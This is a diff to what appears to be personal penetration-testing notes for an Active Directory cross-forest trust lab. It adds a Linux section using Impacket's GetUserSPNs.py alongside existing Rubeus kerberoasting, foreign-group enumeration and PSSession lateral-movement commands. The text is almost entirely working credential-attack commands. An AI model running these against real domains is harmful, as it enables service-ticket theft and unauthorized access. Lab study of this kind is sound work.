@@ -8,7 +8,7 @@ Atack
 ```
 .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
 ```
-# Password Re-Use
+## Password Re-Use
 Enumeration
 ```
 Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
@@ -17,4 +17,13 @@ Convert-SidToName ADMINSID
 Lateral Movement
 ```
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+```
+# Linux
+Enumeration
+```
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+Atack
+```
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
 ```
